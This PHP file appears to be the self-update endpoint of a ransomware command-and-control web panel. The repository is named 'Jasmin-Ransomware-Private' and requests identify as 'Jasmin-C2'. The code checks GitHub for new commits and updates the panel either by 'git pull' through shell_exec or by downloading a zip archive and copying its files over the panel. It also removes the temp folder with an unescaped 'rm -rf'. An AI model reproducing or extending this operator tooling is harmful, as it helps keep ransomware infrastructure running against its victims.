<?php
/**
 * 检查更新 + 一键自动更新API
 */
require_once __DIR__ . '/includes/auth.php';
require_auth();
header('Content-Type: application/json');

define('CURRENT_VERSION', '1.0.0');
define('REPO', '2016xyz/Jasmin-Ransomware-Private');
define('GIT_TOKEN', trim($_ENV['GIT_TOKEN'] ?? ''));

$action = $_GET['action'] ?? 'check';
if ($action === 'check') check_update();
elseif ($action === 'update') do_update();
else echo json_encode(['ok'=>false,'msg'=>'无效操作']);

function gh_get($url) {
    $h = "User-Agent: Jasmin-C2\r\n";
    if (GIT_TOKEN) $h .= "Authorization: token " . GIT_TOKEN . "\r\n";
    $ctx = stream_context_create(['http'=>['header'=>$h,'timeout'=>15]]);
    return @file_get_contents($url, false, $ctx);
}

function check_update() {
    $url = 'https://api.github.com/repos/' . REPO . '/commits?per_page=1';
    $json = gh_get($url);
    if (!$json) {
        echo json_encode(['ok'=>true,'update'=>false,'current'=>CURRENT_VERSION,'msg'=>'无法连接更新服务器']);
        return;
    }
    $data = json_decode($json, true);
    $sha = substr($data[0]['sha'] ?? '', 0, 7);
    $date = $data[0]['commit']['committer']['date'] ?? '';
    $msg = $data[0]['commit']['message'] ?? '';
    echo json_encode(['ok'=>true,'update'=>true,'current'=>CURRENT_VERSION,
        'latest_commit'=>$sha,'date'=>$date,'message'=>$msg]);
}

function do_update() {
    $root = dirname(__DIR__);
    $git = $root . '/.git';
    if (is_dir($git)) {
        $out = shell_exec("cd " . escapeshellarg($root) . " && git pull 2>&1");
        echo json_encode(['ok'=>true,'method'=>'git','output'=>$out]);
    } else {
        $url = "https://api.github.com/repos/" . REPO . "/zipball/master";
        $zip = gh_get($url);
        if (!$zip) { echo json_encode(['ok'=>false,'msg'=>'下载失败']); return; }
        $tmp = tempnam(sys_get_temp_dir(),'jasmin_') . '.zip';
        file_put_contents($tmp, $zip);
        $za = new ZipArchive();
        if ($za->open($tmp) !== true) { echo json_encode(['ok'=>false,'msg'=>'解压失败']); return; }
        $za->extractTo(sys_get_temp_dir() . '/jasmin_update');
        $za->close(); unlink($tmp);
        $dirs = glob(sys_get_temp_dir() . '/jasmin_update/*', GLOB_ONLYDIR);
        if ($dirs) shell_exec("cp -rf " . escapeshellarg($dirs[0] . '/Web Panel/') . "/* " . escapeshellarg(__DIR__) . "/");
        shell_exec("rm -rf " . sys_get_temp_dir() . "/jasmin_update");
        echo json_encode(['ok'=>true,'method'=>'zip','msg'=>'更新完成']);
    }
}
